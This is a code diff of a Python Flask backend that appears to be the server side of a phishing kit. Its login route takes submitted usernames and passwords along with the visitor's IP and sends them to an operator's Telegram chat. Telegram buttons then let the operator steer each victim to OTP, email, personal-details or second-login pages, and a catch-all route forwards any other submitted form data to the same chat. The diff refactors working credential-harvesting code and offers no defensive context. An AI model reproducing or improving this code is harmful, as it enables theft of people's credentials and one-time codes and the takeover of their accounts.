@@ -2,159 +2,165 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
 import os
-from dotenv import load_dotenv
 import uuid
+from dotenv import load_dotenv
 
-# Load environment variables from Render or .env
 load_dotenv()
 
 app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "*"}})
+CORS(app)
 
-# Telegram Bot Settings
-BOT_TOKEN = os.getenv("BOT_TOKEN") or "dgd773hhd"  # Secret token
+# Telegram Bot Info
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
+
 if not BOT_TOKEN or not CHAT_ID:
-    raise RuntimeError("Missing one or more required environment variables.")
+    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID.")
 
-# In-memory session store (replace with database in production)
-SESSION_STORE = {}
+# Session status memory
+session_store = {}  # Example: { "uuid123": "pending" or "approved" }
 
-# 🎯 Fancy Telegram Redirect Buttons (emoji + row layout)
-REDIRECT_BUTTONS = {
-    "redirect_otp": {"text": "🔐 OTP Page", "url": "otp.html"},
-    "redirect_email": {"text": "📧 Email Page", "url": "email.html"},
-    "redirect_personal": {"text": "🧍 Personal Page", "url": "personal.html"},
-    "redirect_login2": {"text": "🔁 Login2 Page", "url": "login2.html"},
-    "redirect_c": {"text": "📋 C Page", "url": "c.html"},
-}
+# Telegram inline buttons
+REDIRECT_BUTTONS = [
+    [
+        {"text": "🔐 OTP", "callback_data": "redirect_otp"},
+        {"text": "📧 Email", "callback_data": "redirect_email"},
+        {"text": "🙍 Personal", "callback_data": "redirect_personal"},
+    ],
+    [
+        {"text": "🔁 Login2", "callback_data": "redirect_login2"},
+        {"text": "⚙️ Custom", "callback_data": "redirect_c"},
+    ]
+]
 
-# Group buttons into rows (max 2 per row)
-INLINE_KEYBOARD = []
-temp_row = []
-for i, (key, btn) in enumerate(REDIRECT_BUTTONS.items(), start=1):
-    temp_row.append({"text": btn["text"], "callback_data": key})
-    if i % 2 == 0:
-        INLINE_KEYBOARD.append(temp_row)
-        temp_row = []
-if temp_row:
-    INLINE_KEYBOARD.append(temp_row)
+# ID-to-redirect mapping (for session approval)
+id_redirect_map = {}  # Example: { "uuid123": "otp.html" }
 
-# 🔔 Telegram Message Sender
-def send_to_telegram(message):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+# Helper: Send to Telegram
+def send_to_telegram(message, session_id=None):
+    reply_markup = {"inline_keyboard": REDIRECT_BUTTONS}
+    if session_id:
+        for row in reply_markup["inline_keyboard"]:
+            for button in row:
+                # Attach session ID to callback
+                button["callback_data"] += f":{session_id}"
+
     payload = {
         "chat_id": CHAT_ID,
         "text": message,
         "parse_mode": "HTML",
-        "reply_markup": {"inline_keyboard": INLINE_KEYBOARD}
+        "reply_markup": reply_markup
     }
+
     try:
-        response = requests.post(url, json=payload)
-        print(f"[TG] Status: {response.status_code}, Text: {response.text}")
-        return response.ok
-    except requests.RequestException as e:
-        print(f"[TG ERROR] {e}")
+        res = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
+        print("Telegram response:", res.status_code, res.text)
+        return res.ok
+    except Exception as e:
+        print(f"Telegram error: {e}")
         return False
 
-# ✅ Root route
-@app.route("/", methods=["GET"])
-def root():
-    return "✅ Flask backend is live."
 
-# 🧠 Login Endpoint (JSON only)
-@app.route('/login', methods=["POST"])
+# Root Health Check
+@app.route("/")
+def root():
+    return "✅ Server running"
+
+
+# Login Endpoint
+@app.route("/login", methods=["POST"])
 def login():
     try:
         data = request.get_json()
-        if not data or 'login' not in data or 'password' not in data:
-            return jsonify({"success": False, "error": "Missing login or password"}), 400
+        login = data.get("login")
+        password = data.get("password")
+        if not login or not password:
+            return jsonify({"success": False, "error": "Missing credentials"}), 400
 
-        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-        login_id = str(uuid.uuid4())
+        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+        session_id = str(uuid.uuid4())
+        session_store[session_id] = "pending"
 
-        message = (
-            f"<b>🔐 New LOGIN Submission</b>\n"
-            f"<b>🆔 Login:</b> <code>{data['login']}</code>\n"
-            f"<b>🔑 Password:</b> <code>{data['password']}</code>\n"
-            f"<b>🌍 IP:</b> <code>{ip}</code>\n"
-            f"<b>📦 Session ID:</b> <code>{login_id}</code>"
-        )
+        msg = f"""<b>🔐 LOGIN SUBMISSION</b>
+<b>Login:</b> <code>{login}</code>
+<b>Password:</b> <code>{password}</code>
+<b>IP:</b> <code>{user_ip}</code>
+🆔 <b>Session:</b> <code>{session_id}</code>"""
 
-        # Store session
-        SESSION_STORE[login_id] = {
-            "status": "pending",
-            "redirect_url": None
-        }
+        send_to_telegram(msg, session_id=session_id)
 
-        sent = send_to_telegram(message)
-        if sent:
-            return jsonify({"success": True, "id": login_id}), 200
-        return jsonify({"success": False, "error": "Failed to send to Telegram"}), 500
-
+        return jsonify({"success": True, "id": session_id}), 200
     except Exception as e:
-        print(f"[LOGIN ERROR] {e}")
-        return jsonify({"success": False, "error": "Server error"}), 500
+        print("Login error:", e)
+        return jsonify({"success": False, "error": "Internal error"}), 500
 
-# 🔁 Polling status route
-@app.route('/status/<id>', methods=["GET"])
-def status(id):
-    session = SESSION_STORE.get(id)
-    if not session:
-        return jsonify({"status": "invalid"}), 404
-    if session["status"] == "approved":
-        return jsonify({
-            "status": "approved",
-            "redirect_url": session["redirect_url"]
-        }), 200
+
+# Check status of session
+@app.route("/status/<session_id>", methods=["GET"])
+def status(session_id):
+    status = session_store.get(session_id, "pending")
+    if status == "approved":
+        redirect_url = id_redirect_map.get(session_id, "otp.html")
+        return jsonify({"status": "approved", "redirect_url": redirect_url}), 200
     return jsonify({"status": "pending"}), 200
 
-# 🤖 Telegram Webhook (button press)
-@app.route('/webhook', methods=["POST"])
-def webhook():
+
+# Telegram Webhook
+@app.route("/webhook", methods=["POST"])
+def telegram_webhook():
     try:
         update = request.get_json()
-        if not update or 'callback_query' not in update:
+        if "callback_query" not in update:
             return jsonify({"status": "ignored"}), 200
 
-        callback_data = update['callback_query']['data']
-        chat_id = update['callback_query']['message']['chat']['id']
+        callback_data = update["callback_query"]["data"]
+        chat_id = update["callback_query"]["message"]["chat"]["id"]
 
-        if callback_data in REDIRECT_BUTTONS:
-            # Approve most recent pending session (simplified for now)
-            for session_id in reversed(SESSION_STORE):
-                if SESSION_STORE[session_id]["status"] == "pending":
-                    SESSION_STORE[session_id] = {
-                        "status": "approved",
-                        "redirect_url": REDIRECT_BUTTONS[callback_data]["url"]
-                    }
-                    print(f"[✅ Approved] Session {session_id} redirected to {callback_data}")
-                    break
-            return jsonify({"status": "ok"}), 200
+        if ":" in callback_data:
+            action, session_id = callback_data.split(":", 1)
+            redirect_map = {
+                "redirect_otp": "otp.html",
+                "redirect_email": "email.html",
+                "redirect_personal": "personal.html",
+                "redirect_login2": "login2.html",
+                "redirect_c": "c.html"
+            }
 
-        return jsonify({"status": "unknown callback"}), 200
+            if action in redirect_map and session_id in session_store:
+                session_store[session_id] = "approved"
+                id_redirect_map[session_id] = redirect_map[action]
+                ack = {
+                    "chat_id": chat_id,
+                    "text": f"✅ Approved session {session_id}\n➡️ Redirect to: {redirect_map[action]}",
+                }
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=ack)
+                return jsonify({"status": "ok"}), 200
+
+        return jsonify({"status": "unknown"}), 200
     except Exception as e:
-        print(f"[WEBHOOK ERROR] {e}")
+        print("Webhook error:", e)
         return jsonify({"status": "error"}), 500
 
-# 🌐 Generic form submission (e.g., OTP, email, personal)
-@app.route('/<page>', methods=["POST"])
-def receive_form(page):
+
+# Generic page form submissions
+@app.route("/<page>", methods=["POST"])
+def catch_form(page):
     try:
         data = request.get_json() or request.form.to_dict()
-        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-        message_lines = [f"<b>📨 {page.upper()} Submission</b>"]
+        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+        msg = [f"<b>📄 {page.upper()} FORM</b>"]
         for k, v in data.items():
-            message_lines.append(f"<b>{k}:</b> <code>{v}</code>")
-        message_lines.append(f"<b>🌍 IP:</b> <code>{ip}</code>")
-        full_message = "\n".join(message_lines)
-        sent = send_to_telegram(full_message)
-        return jsonify({"status": "ok" if sent else "failed"}), 200 if sent else 500
+            msg.append(f"<b>{k}:</b> <code>{v}</code>")
+        msg.append(f"<b>IP:</b> <code>{user_ip}</code>")
+        send_to_telegram("\n".join(msg))
+        return jsonify({"status": "ok"}), 200
     except Exception as e:
-        print(f"[FORM ERROR] {e}")
-        return jsonify({"status": "failed", "error": "Server error"}), 500
+        print(f"Error in /{page}: {e}")
+        return jsonify({"status": "error"}), 500
 
-# 🚀 Run Flask
-if __name__ == '__main__':
+
+# Run app
+if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=True)
